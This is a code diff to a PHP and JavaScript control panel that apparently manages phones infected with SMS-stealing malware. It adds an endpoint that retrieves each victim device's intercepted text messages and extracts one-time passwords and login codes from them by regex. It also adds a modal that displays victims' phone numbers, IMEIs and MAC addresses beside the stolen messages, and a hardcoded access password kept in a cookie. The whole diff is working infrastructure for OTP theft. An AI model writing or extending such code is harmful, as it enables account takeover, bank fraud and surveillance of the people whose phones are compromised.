@@ -64,11 +64,18 @@ function botSend($text) {
   curl_close($ch);
 }
 
-// ====== IP CHECK ======
+// ====== SESSION / AUTH ======
+define('PANEL_PWD', 'Alexa');
 $visitorIP = getRealIP();
+$passAuth = isset($_POST['pwd']) && $_POST['pwd'] === PANEL_PWD;
+
+// Cookie-based auth for IP changes
+$cookieAuth = isset($_COOKIE['aa_auth']) && $_COOKIE['aa_auth'] === md5(PANEL_PWD);
+if ($passAuth) { setcookie('aa_auth', md5(PANEL_PWD), time() + 86400 * 30, '/'); $cookieAuth = true; }
+
 $allowedIPs = fb('panel/allowed_ips');
 if (!is_array($allowedIPs)) $allowedIPs = [];
-$isAllowed = in_array($visitorIP, $allowedIPs) || in_array('*', $allowedIPs);
+$isAllowed = ($cookieAuth || in_array($visitorIP, $allowedIPs) || in_array('*', $allowedIPs));
 
 // Log visitor
 $visitors = fb('panel/visitors');
@@ -132,6 +139,27 @@ if ($ajax) {
     $raw = fb('panel/allowed_ips'); // lightweight check
     $ms = round((microtime(true) - $start) * 1000);
     echo json_encode(['ok' => true, 'ping' => $ms, 'php' => PHP_VERSION]);
+    exit;
+  }
+  
+  if ($ajax === 'device_sms') {
+    $devId = $_GET['dev'] ?? '';
+    if (!$devId) { echo json_encode([]); exit; }
+    $raw = fb('user_sms/' . $devId);
+    $sms = [];
+    if (is_array($raw)) {
+      foreach ($raw as $k => $v) {
+        if (!is_array($v)) continue;
+        $sender = $v['sender'] ?? $v['senderNumber'] ?? $v['from'] ?? $v['address'] ?? '';
+        $body = $v['body'] ?? $v['msg'] ?? $v['message'] ?? $v['text'] ?? $v['content'] ?? '';
+        if ($body) {
+          $o = preg_match('/(?:OTP|code|verif|login|one.?time|otp)\s*(?::|is)?\s*(\d{4,8})/i', $body, $m) ? $m[1] : '';
+          $sms[] = ['sender' => $sender, 'body' => $body, 'otp' => $o, 'date' => $v['timestamp'] ?? $v['date'] ?? ''];
+        }
+      }
+    }
+    usort($sms, function($a, $b) { return ($b['date']??0) - ($a['date']??0); });
+    echo json_encode($sms);
     exit;
   }
   
@@ -203,6 +231,10 @@ body{background:#0a0a0f;min-height:100vh;display:flex;align-items:center;justify
     <span>📡 YOUR IP HAS BEEN LOGGED</span>
     <strong><?php echo htmlspecialchars($visitorIP); ?></strong>
   </div>
+  <form method="post" style="margin-top:20px;display:flex;gap:8px;justify-content:center;align-items:center;flex-wrap:wrap">
+    <input type="password" name="pwd" placeholder="Access Key" style="padding:10px 16px;border:1px solid rgba(255,0,0,.15);border-radius:8px;background:rgba(255,255,255,.03);color:#fff;font-size:13px;font-family:'Orbitron',monospace;outline:none;width:180px">
+    <button type="submit" style="padding:10px 20px;border:none;border-radius:8px;background:linear-gradient(135deg,#6c3cf0,#4a1fc0);color:#fff;font-size:12px;font-family:'Orbitron',monospace;cursor:pointer">Unlock</button>
+  </form>
 </div>
 <div class="footer-ip">🔒 Alexa Admin • IP Detective Active</div>
 <script>
@@ -283,7 +315,8 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 .toolbar .f-btn.act{border-color:rgba(108,60,240,.2);background:rgba(108,60,240,.08);color:#6c3cf0}
 .toolbar .p{font-size:11px;color:rgba(255,255,255,.25);padding:6px 10px}
 .d-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:10px}
-.d-card{padding:16px;cursor:pointer;position:relative;overflow:hidden;animation:cardIn .3s ease-out both}
+.d-card{padding:16px;cursor:pointer;position:relative;overflow:hidden;animation:cardIn .3s ease-out both;transition:all .3s}
+.d-card:hover{border-color:rgba(108,60,240,.2);transform:translateY(-2px);box-shadow:0 8px 30px rgba(108,60,240,.06)}
 .d-card::before{content:'';position:absolute;top:0;left:0;width:3px;height:100%;border-radius:0 3px 3px 0}
 .d-card.on::before{background:linear-gradient(180deg,#1ec864,#10b060)}
 .d-card.off::before{background:linear-gradient(180deg,#f03c6c,#d03050)}
@@ -326,6 +359,11 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
 @keyframes cardIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
 @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
 .pulse{animation:pulse 2s infinite}
+.cpy{float:right;padding:2px 8px;border:none;border-radius:4px;background:rgba(108,60,240,.15);color:#6c3cf0;font-size:10px;cursor:pointer;font-family:'Orbitron',monospace}
+.cpy:hover{background:rgba(108,60,240,.3)}
+.modal-c::-webkit-scrollbar{width:4px}
+.modal-c::-webkit-scrollbar-track{background:transparent}
+.modal-c::-webkit-scrollbar-thumb{background:rgba(255,255,255,.1);border-radius:2px}
 </style>
 </head>
 <body>
@@ -393,6 +431,18 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;b
   </div>
 </div>
 
+<!-- MODAL -->
+<div class="modal-over" id="modalOver" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;z-index:100;background:rgba(0,0,0,.6);backdrop-filter:blur(8px);align-items:center;justify-content:center;padding:20px">
+  <div class="modal-c glass" style="width:600px;max-width:100%;max-height:85vh;overflow-y:auto;padding:24px;animation:modalIn .3s ease-out">
+    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
+      <h2 id="modalTitle" style="font-size:18px;font-weight:700"></h2>
+      <button onclick="closeModal()" style="width:32px;height:32px;border-radius:50%;border:none;background:rgba(255,255,255,.04);color:rgba(255,255,255,.3);cursor:pointer;font-size:16px">✕</button>
+    </div>
+    <div id="modalBody"></div>
+  </div>
+</div>
+@keyframes modalIn{from{opacity:0;transform:scale(.95)translateY(10px)}to{opacity:1;transform:scale(1)translateY(0)}}
+
 <div id="toast" style="position:fixed;bottom:30px;left:50%;transform:translateX(-50%);z-index:200;padding:10px 24px;border-radius:8px;font-size:12px;font-weight:500;background:rgba(0,0,0,.7);backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,.06);color:#fff;display:none;animation:fadeUp .2s"></div>
 
 <script>
@@ -436,7 +486,7 @@ function applyFilter(){
   list.forEach(function(i){
     var d=i.dev,id=i.id,p=ph(d)||'-',st=d.status||'offline',b=parseInt(d.battery||d.battery_level||0)||0;
     var model=d.d_name||'Device',nm=sn(d),n1=d.numberSim1||'',n2=d.numberSim2||'',bc=b>50?'hi':b>20?'md':'lo',si=simOp(nm||p),last=d.TimeandDate||'';
-    html+='<div class="d-card glass '+st+'"><div class="d-top"><div class="d-name">'+esc(model)+'</div><div class="d-status">'+st+'</div></div>'
+    html+='<div class="d-card glass '+st+'" onclick="openDevice(\''+id+'\')"><div class="d-top"><div class="d-name">'+esc(model)+'</div><div class="d-status">'+st+'</div></div>'
       +'<div class="d-row"><div>Phone: <strong>'+esc(p)+'</strong></div><div>Battery: <strong>'+b+'%</strong></div>';
     if(n1)html+='<div>SIM1: <strong>'+esc(n1)+'</strong></div>';
     if(n2)html+='<div>SIM2: <strong>'+esc(n2)+'</strong></div>';
@@ -455,6 +505,44 @@ function setF(f,btn){FILTER=f;document.querySelectorAll('#tDevices .f-btn').forE
 function ph(d){var f=['phoneNumber','number','numberSim1','sim1','PhoneNumber','phone','mobile','number1','simNumber','mobNo','sim1Number'];for(var i=0;i<f.length;i++){var v=(d[f[i]]||'').trim();if(v&&v!=='Not Available'&&v!=='No Data'&&v!=='No SIM Found'&&v!=='Unknown'&&v!==''&&v!=='Restricted')return v}return ''}
 function sn(d){var f=['nameSim1','name1','sim1Name','sim1Carrier','operator1','operator','carrierName','nameSim2','sim2Name','sim2Carrier'];for(var i=0;i<f.length;i++){var v=(d[f[i]]||'').trim();if(v&&v!=='Not Available'&&v!=='No Data'&&v!=='Unknown'&&v!=='')return v}return ''}
 function simOp(s){var l=(s||'').toLowerCase();if(l.includes('jio')||l.includes('ril'))return'sim-jio';if(l.includes('airtel')||l.includes('air'))return'sim-air';if(l.includes('vi')||l.includes('vodafone')||l.includes('idea'))return'sim-vi';if(l.includes('bsnl')||l.includes('bs'))return'sim-bs';return'sim-oth'}
+
+// ====== MODAL ======
+function closeModal(){document.getElementById('modalOver').style.display='none'}
+function openDevice(id){
+  var d=DEV[id];if(!d){show('Device not found');return}
+  var p=ph(d),nm=sn(d),n1=d.numberSim1||'',n2=d.numberSim2||'',model=d.d_name||'Device',st=d.status||'offline',b=parseInt(d.battery||d.battery_level||0)||0,last=d.TimeandDate||'',android=d.androidVersion||d.android||d.sdk||'',mac=d.wifiMac||d.mac||d.wifi||'',im1=d.imei1||d.imei||'',im2=d.imei2||'';
+  document.getElementById('modalTitle').textContent=esc(model)+' ['+st+']';
+  var html='<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px">'
+    +'<div class="glass" style="padding:10px;border-radius:8px"><div style="opacity:.4;font-size:10px">Phone</div><strong>'+esc(p)+'</strong></div>'
+    +'<div class="glass" style="padding:10px;border-radius:8px"><div style="opacity:.4;font-size:10px">Battery</div><strong style="color:'+(b<20?'#ff2d55':'#1ec864')+'">'+b+'%</strong></div>'
+    +(n1?'<div class="glass" style="padding:10px;border-radius:8px"><div style="opacity:.4;font-size:10px">SIM1</div><strong>'+esc(n1)+'</strong><button class="cpy" data-v="'+esc(n1)+'" onclick="copy(this)">Copy</button></div>':'')
+    +(n2?'<div class="glass" style="padding:10px;border-radius:8px"><div style="opacity:.4;font-size:10px">SIM2</div><strong>'+esc(n2)+'</strong><button class="cpy" data-v="'+esc(n2)+'" onclick="copy(this)">Copy</button></div>':'')
+    +(nm?'<div class="glass" style="padding:10px;border-radius:8px"><div style="opacity:.4;font-size:10px">Operator</div><strong>'+esc(nm)+'</strong></div>':'')
+    +(android?'<div class="glass" style="padding:10px;border-radius:8px"><div style="opacity:.4;font-size:10px">Android</div><strong>'+esc(android)+'</strong></div>':'')
+    +(im1?'<div class="glass" style="padding:10px;border-radius:8px"><div style="opacity:.4;font-size:10px">IMEI1</div><div style="font-size:12px;word-break:break-all">'+esc(im1)+'</div></div>':'')
+    +(im2?'<div class="glass" style="padding:10px;border-radius:8px"><div style="opacity:.4;font-size:10px">IMEI2</div><div style="font-size:12px;word-break:break-all">'+esc(im2)+'</div></div>':'')
+    +(mac?'<div class="glass" style="padding:10px;border-radius:8px;grid-column:1/-1"><div style="opacity:.4;font-size:10px">MAC</div><div style="font-size:12px;word-break:break-all">'+esc(mac)+'</div></div>':'')
+    +(last?'<div class="glass" style="padding:10px;border-radius:8px;grid-column:1/-1"><div style="opacity:.4;font-size:10px">Last Seen</div><strong>'+esc(last)+'</strong></div>':'')
+    +'<div class="glass" style="padding:10px;border-radius:8px;grid-column:1/-1"><div style="opacity:.4;font-size:10px">Device ID</div><div style="font-size:11px;word-break:break-all">'+esc(id)+'</div></div></div>';
+  // SMS from this device
+  html+='<div style="margin-bottom:8px;font-size:14px;font-weight:600">💬 SMS from this device</div><div id="mSmsList"><div class="load"><div class="sp"></div></div></div>';
+  document.getElementById('modalBody').innerHTML=html;
+  document.getElementById('modalOver').style.display='flex';
+  // Fetch device SMS
+  fetch('panel.php?ajax=device_sms&dev='+encodeURIComponent(id)).then(function(r){return r.json()}).then(function(sms){
+    var l=document.getElementById('mSmsList');
+    if(!sms||!sms.length){l.innerHTML='<div class="sms-e">No SMS from this device</div>';return}
+    l.innerHTML='';
+    sms.forEach(function(m){
+      var b=m.body||'',o=m.otp||'';
+      l.innerHTML+='<div class="sms-i glass" style="margin-bottom:4px"><div class="s-sender">'+esc(m.sender||'Unknown')+'</div>'
+        +'<div class="s-body">'+esc(b)+'</div><div class="s-btm"><span>'+fmt(m.date)+'</span>'
+        +(o?'<span class="s-otp">'+esc(o)+'</span>':'')
+        +'<span style="cursor:pointer;padding:2px 6px;border-radius:3px;background:rgba(255,255,255,.03)" onclick="navigator.clipboard.writeText(\''+esc(b).replace(/'/g,"\\'")+'\');show(\'Copied\')">Copy</span></div></div>';
+    });
+  }).catch(function(){document.getElementById('mSmsList').innerHTML='<div class="sms-e">Failed to load SMS</div>'});
+}
+function copy(el){navigator.clipboard.writeText(el.getAttribute('data-v'));show('Copied: '+el.getAttribute('data-v'))}
 
 // ====== SMS ======
 function filterSms(){
